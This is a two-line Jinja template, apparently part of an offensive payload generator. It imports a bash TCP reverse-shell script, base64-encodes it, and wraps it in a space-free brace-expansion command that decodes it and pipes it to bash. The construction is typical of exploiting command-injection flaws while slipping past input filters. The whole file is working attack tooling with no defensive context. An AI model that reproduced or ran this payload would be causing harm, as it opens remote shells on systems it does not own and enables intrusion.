{% import 'reverse/connector/bash-tcp.sh' as payload with context -%}
{echo,{{ payload|utf8|base64 }}}|{base64,-d}|bash
